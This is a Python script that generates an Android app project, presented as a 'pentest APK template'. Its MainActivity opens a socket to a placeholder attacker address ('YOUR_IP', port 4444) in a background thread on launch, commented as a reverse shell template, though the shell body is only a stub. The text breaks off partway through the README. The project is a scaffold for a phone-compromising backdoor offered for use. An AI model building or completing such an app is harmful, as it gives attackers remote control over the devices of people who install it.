import zipfile
from typing import BinaryIO
import os

def generate_apk_structure(zip_buffer: BinaryIO):
    """Complete pentest APK template"""
    
    files = {
        "app/src/main/java/com/pentest/apk/MainActivity.java": '''package com.pentest.apk;

import android.app.Activity;
import android.os.Bundle;
import java.net.Socket;
import java.io.*;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // REVERSE SHELL TEMPLATE - Edit YOUR_IP:PORT
        new Thread(() -> {
            try {
                Socket s = new Socket("YOUR_IP", 4444);
                // Full reverse shell implementation here
            } catch (Exception e) {}
        }).start();
    }
}''',
        
        "app/src/main/AndroidManifest.xml": '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.pentest.apk">
    
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    
    <application android:allowBackup="true">
        <activity android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>''',
        
        "build.gradle": '''plugins {
    id 'com.android.application'
}

android {
    compileSdk 34
    defaultConfig {
        applicationId "com.pentest.apk"
        minSdk 21
        targetSdk 34
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
}''',
        
        "README.md": '''# Pentest APK Template

## Quick Build
```bash
./gradlew assembleDebug
